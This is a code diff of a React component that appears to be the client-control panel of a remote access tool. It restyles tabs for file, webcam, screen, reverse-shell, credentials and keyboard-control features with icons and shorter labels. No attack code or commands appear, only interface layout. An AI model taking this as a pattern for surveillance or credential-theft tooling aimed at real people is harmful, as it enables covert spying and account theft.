@@ -3,7 +3,17 @@ import {useDispatch} from 'react-redux';
 import {Paper, Tabs, Tab as MuiTab, IconButton} from '@mui/material';
 import FileManager from "../Funcionalities/FileManager/FileManager";
 import WebcamManager from "@components/Funcionalities/WebcamManager/WebcamManager";
-import {ArrowBack, Toc} from "@mui/icons-material";
+import {
+    ArrowBack,
+    CameraAlt,
+    Dns,
+    FolderShared,
+    Keyboard,
+    LaptopWindows, Message,
+    Password,
+    Terminal,
+    Toc
+} from "@mui/icons-material";
 import ScreenManager from "@components/Funcionalities/ScreenManager/ScreenManager";
 import ReverseShell from "@components/Funcionalities/ReverseShell/ReverseShell";
 import CredentialsManager from "@components/Funcionalities/CredentialsManager/CredentialsManager";
@@ -30,15 +40,15 @@ function ClientManager({client, onBack}) {
             <IconButton onClick={onBack} sx={{mt: 1, ml: 1}}>
                 <ArrowBack/>
             </IconButton>
-            <Tabs value={currentTab} onChange={handleChange}>
-                <MuiTab label="Information"/>
-                <MuiTab label="File manager"/>
-                <MuiTab label="Webcam manager"/>
-                <MuiTab label="Screen manager"/>
-                <MuiTab label="Reverse shell"/>
-                <MuiTab label="Credentials manager"/>
-                <MuiTab label="Keyboard controller"/>
-                <MuiTab label="Message box"/>
+            <Tabs value={currentTab} onChange={handleChange}  variant="scrollable" scrollButtons="auto">
+                <MuiTab iconPosition="start" icon={<Dns/>} label="System"/>
+                <MuiTab iconPosition="start" icon={<FolderShared/>} label="Files"/>
+                <MuiTab iconPosition="start" icon={<CameraAlt/>} label="Webcam"/>
+                <MuiTab iconPosition="start" icon={<LaptopWindows/>} label="Screen"/>
+                <MuiTab iconPosition="start" icon={<Terminal/>} label="Shell"/>
+                <MuiTab iconPosition="start" icon={<Password/>} label="Credentials"/>
+                <MuiTab iconPosition="start" icon={<Keyboard/>} label="Controller"/>
+                <MuiTab iconPosition="start" icon={<Message/>} label="Message box"/>
 
             </Tabs>
 
